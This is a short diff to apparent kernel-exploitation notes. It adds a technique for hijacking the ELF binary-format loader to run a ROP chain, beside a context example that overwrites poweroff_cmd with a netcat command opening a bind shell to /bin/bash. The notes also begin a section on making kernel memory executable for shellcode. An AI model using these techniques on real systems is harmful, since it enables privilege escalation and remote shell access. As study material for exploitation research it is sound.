@@ -297,6 +297,12 @@ Global variable hijacking
 
     - E.g. `poweroff_cmd[] = "/bin/sh -c /bin/sleep${IFS}10&&/usr/bin/nc${IFS}-lnvp${IFS}13337${IFS}-e${IFS}/bin/bash"`
 
+- `compat_elf_format->load_binary` (last `formats` entry)
+
+    - The rbx will be file content, which allows you to do ROP chain
+
+    - It can be triggered by executing a file with unknown format
+
 Kernel shellcode
 
 - Set kernel address as executable by `set_memory_x(page_aligned_addr, num_of_page)`.
